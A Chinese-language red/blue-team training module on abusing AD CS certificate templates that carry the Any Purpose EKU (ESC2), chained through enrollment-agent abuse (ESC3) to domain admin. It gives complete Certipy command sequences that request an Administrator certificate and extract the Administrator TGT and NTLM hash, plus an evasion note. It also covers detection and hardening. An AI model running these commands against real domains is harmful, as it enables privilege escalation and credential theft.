# R17.2 過寬憑證用途與任意用途 (Any Purpose) EKU 濫用分析 (Over-Permissive Certificate Purpose / ESC2)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**過寬憑證用途與任意用途 EKU 濫用 (AD CS ESC2)** 發生於憑證範本的擴充金鑰用途 (Extended Key Usage, EKU) 定義過度寬鬆時。其本質為：**「憑證範本配置了『任意用途 (Any Purpose, OID: `2.5.29.37.0`)』或未配置任何 EKU（即子 CA 語意）；即使該範本未開啟自訂 SAN（無 ESC1 條件），攻擊者取得該憑證後，依然能將其當作『憑證註冊代理人 (Certificate Request Agent / Enrollment Agent)』使用，藉此代表網域管理員簽署二次憑證申請 (ESC3 鏈式攻擊)，達成迂迴提權」**。

```
[低權限用戶 (operator)] ── 1. 申請配置 Any Purpose EKU 之憑證 ──► [企業 CA]
                                                                        │
                                                                        ▼ 範本允許 Domain Users 註冊
                                                                [CA 簽發 AnyPurpose.pfx]
                                                                        │
[攻擊者控制台] ◄── 2. 取得包含 OID 2.5.29.37.0 之憑證 ─────────────────┘
       │
       ├── 3. 將該憑證充當「註冊代理人 (Enrollment Agent)」
       ├── 4. 代表 Administrator 簽發使用者憑證 (On-Behalf-Of CSR) ──► [企業 CA (User 範本)]
       ▼                                                                   │
[取得 Administrator.pfx] ◄────────────────────────────────────────────────┘
       │
       ▼ 5. Kerberos PKINIT 換取 TGT ➔ 網域全盤淪陷！
```

### 核心作戰決策與邊界
- **ESC2 核心判定條件**：
  1. 範本配置允許 `Any Purpose` EKU (`2.5.29.37.0`)，或 `pKIExtendedKeyUsage` 屬性為空。
  2. 註冊權限開放給低權限網域用戶。
  3. 不需要憑證管理員手動審批與簽章。
- **技術邊界**：
  - **與 ESC1 差異**：ESC1 依賴範本直接支援在 CSR 中自訂 SAN；ESC2 範本通常無須 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`，攻擊者先取得自身的 Any Purpose 憑證，再串聯註冊代理人機制完成提權。

## 🔬 第一動：Any Purpose EKU 與 SubCA 語意全景解剖 (Mechanics & EKU Semantics)

### 1. 擴充金鑰用途 (EKU) 特殊值物理語意

| EKU 類型 / OID | 規範名稱 (CryptoAPI Constant) | 物理權限與危害 |
| :--- | :--- | :--- |
| **`2.5.29.37.0`** | `szOID_ANY_ENHANCED_KEY_USAGE` (Any Purpose) | 萬能用途，可自動充當用戶端驗證、代碼簽章、智慧卡登入、**憑證註冊代理**。 |
| **空值 (Empty EKU)** | Subordinate CA (無金鑰用途限制) | 在 Windows X.509 規範中，無 EKU 限制之憑證可作為子 CA，簽發任意其他從屬憑證。 |
| **`1.3.6.1.4.1.311.20.2.1`** | `szOID_ENROLLMENT_AGENT` (Certificate Request Agent) | 允許代表其他使用者向 CA 申請註冊憑證 (Act on behalf of others)。 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy)

#### 1. 探測具備 ESC2 弱點之範本
```bash
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢查輸出中含有 [!] Vulnerabilities: ESC2 的範本 (如 "AnyPurposeTemplate")
```

#### 2. 申請獲取 Any Purpose 憑證
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "AnyPurposeTemplate" -dc-ip 10.0.0.1
# 輸出: operator.pfx (具備 Any Purpose EKU)
```

#### 3. 串聯 ESC3：充當註冊代理代表 Administrator 申請憑證
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "User" -on-behalf-of "corp.internal\Administrator" \
    -pfx operator.pfx -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 4. PKINIT 換取 Administrator 票據
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# 輸出: Administrator TGT 票據與 NTLM Hash
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **防禦規避策略**：
  - 由於第一步申請的 `operator.pfx` 主體完全是攻擊者自己的真實身分，CA 日誌中第一步的 `Requester` 與 `Subject` 完全相符，傳統單純比對 SAN 的告警規則在此階段完全不會觸發。
- **鑑識與遙測特徵**：
  - **Event ID 4887 (CA 簽發審計)**：在第二步中，檢視憑證的 `Requester` 為 `operator`，但發行目標主體 (`Common Name`) 卻是 `Administrator`。
  - **憑證屬性異常**：簽發之憑證中包含 OID `2.5.29.37.0` 或擴充標頭中存在 `szOID_ENROLLMENT_AGENT`。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **Any Purpose 憑證申請** | Event 4887 簽發帶有 `2.5.29.37.0` 之憑證 | 範本中禁止使用 Any Purpose；僅授予單一專用 EKU | 尋找空 EKU 或具備註冊代理之冷門範本 |
| **代簽 (On-Behalf-Of) 提權** | 憑證包含代理簽名；請求者與目標不符 | 限制 CA 的註冊代理人限制策略 (Enrollment Agent Restrictions) | 若註冊代理人限制設為全域允許則無效 |
| **PKINIT 登入** | DC 記錄 PreAuth 16 登入事件 | 限制網域核心特權帳號無法使用憑證登入 | 改用 SChannel 協議進行 LDAP 綁定 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 範本配置修復：最小權限 EKU 宣告
在憑證範本管理員中修改易受攻擊範本：
1. 切換至 **Extensions (延伸規格)** 分頁；
2. 編輯 **Application Policies (應用程式原則)**；
3. **徹底移除 `Any Purpose (所有應用程式原則)`**；
4. 依據業務實際需求，僅勾選特定的單一用途（如 `Client Authentication` 或 `Server Authentication`）。

### 2. 配置註冊代理人限制 (Enrollment Agent Restrictions)
在 CA 伺服器內容的 **Enrollment Agents** 分頁中：
- 限制只有指定的安全小組（如安全維運團隊）才能充當註冊代理人；
- 嚴格限定註冊代理人允許代表申請的帳號範圍（排除 `Domain Admins` 與核心服務帳號）。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **易受攻擊範本**：`General-Purpose-Cert` (包含 Any Purpose EKU，無自訂 SAN 旗標)
- **目標用戶範本**：`User` (預設標準用戶範本)

### 2. 三步驗證流程

1. **申請自身的 Any Purpose 憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA" \
       -template "General-Purpose-Cert" -dc-ip 10.0.0.1
   # 成功產生 user1.pfx
   ```
2. **利用註冊代理特權代表 Administrator 簽發憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA" \
       -template "User" -on-behalf-of "corp.internal\Administrator" \
       -pfx user1.pfx -dc-ip 10.0.0.1
   # 成功產生 Administrator.pfx
   ```
3. **換取 Administrator 雜湊值**：
   ```bash
   certipy auth -pfx Administrator.pfx -dc-ip 10.0.0.1
   # 成功導出 Administrator NTLM Hash，驗證成功！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼 `Any Purpose` EKU (`2.5.29.37.0`) 即使在沒有配置自訂 SAN (ESC1) 的情況下依然極度危險？**  
  *分析思路*：因為 `Any Purpose` 涵蓋了 `Certificate Request Agent`（註冊代理人）功能；攻擊者可先取得自己名下的 Any Purpose 憑證，隨後利用該憑證代表網域內任意特權帳號（如 Administrator）簽發二次憑證。

- [ ] **Q2. 憑證範本如果完全沒有定義任何 EKU（空值），在 X.509 語意中代表什麼含意？**  
  *分析思路*：沒有定義 EKU 的憑證在 X.509 標準中預設代表「無限制」，包含可以作為從屬 CA (Subordinate CA) 使用，或者被各驗證終端當作支援任意用途處理，同樣具備 ESC2 危害。

- [ ] **Q3. 簡述 ESC2 串聯 ESC3 發動鏈式攻擊的核心原理？**  
  *分析思路*：ESC2 提供了具備萬能用途的基底憑證（具備註冊代理能力）；ESC3 則是利用註冊代理人的身分，向另一個允許代簽的使用者憑證範本（如預設的 `User` 範本）發起 `on-behalf-of` 申請，最終拿到管理員憑證。

- [ ] **Q4. 藍隊如何從 CA 簽發日誌中精確鑑別 ESC2/ESC3 鏈式攻擊的特徵？**  
  *分析思路*：Event ID 4887 中出現帶有 `Enrollment Agent` 簽名的憑證要求，且請求者身分與最終憑證頒發的目標主體 (Subject) 不一致。

- [ ] **Q5. 防範 ESC2 憑證濫用的黃金基線原則是什麼？**  
  *分析思路*：落實 EKU 最小權限原則，嚴禁在終端實體 (End-Entity) 範本中使用 `Any Purpose` 或保留空值；並在 CA 上啟用「註冊代理人限制 (Enrollment Agent Restrictions)」以限制代簽目標。
